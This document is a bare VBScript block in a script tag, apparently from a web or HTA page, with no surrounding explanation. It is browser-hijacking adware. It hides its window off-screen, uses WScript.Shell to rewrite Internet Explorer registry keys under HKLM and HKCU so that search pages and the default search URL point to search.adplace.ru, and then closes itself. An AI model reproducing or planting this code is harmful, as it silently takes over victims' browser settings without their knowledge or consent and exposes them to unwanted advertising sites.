<script language=VBS>
self.MoveTo 5000,5000
Set Shl = CreateObject("WScript.Shell")
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Page","http://search.adplace.ru/websearch.php"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar","http://search.adplace.ru/websearch.php?hh=bar"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Use Search Asst","yes"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://search.adplace.ru/websearch.php?hh=assistant"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://search.adplace.ru/websearch.php?hh=customize"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://search.adplace.ru/websearch.php?hh=assistant"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://search.adplace.ru/websearch.php?hh=customize"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\Default_Search_URL","http://search.adplace.ru/websearch.php"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://search.adplace.ru/websearch.php"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://search.adplace.ru/websearch.php"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://search.adplace.ru/websearch.php"
window.close()
</script>